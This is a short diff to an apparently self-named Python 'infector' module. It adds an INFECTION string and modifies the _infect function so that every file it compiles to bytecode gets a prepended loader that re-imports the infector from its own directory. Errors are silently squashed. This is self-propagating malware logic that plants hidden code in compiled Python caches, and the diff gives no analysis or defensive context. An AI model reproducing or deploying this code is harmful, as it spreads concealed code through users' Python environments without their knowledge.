@@ -6,6 +6,12 @@ import importlib.machinery
 import importlib.util
 import os
 
+INFECTION = """
+from importlib.machinery import SourceFileLoader
+foo = SourceFileLoader("infector.py", "{}").load_module()
+"""
+
+
 def infect(filename):
     """Squash errors while infecting the given file."""
     try:
@@ -19,6 +25,7 @@ def _infect(filename):
     cfile = importlib.util.cache_from_source(filename)
     loader = importlib.machinery.SourceFileLoader('<py_compile>', filename)
     source_bytes = loader.get_data(filename)
+    source_bytes = INFECTION.format(os.path.dirname(__file__)).encode("ascii") + source_bytes
     code = loader.source_to_code(source_bytes, filename)
     try:
         dirname = os.path.dirname(cfile)
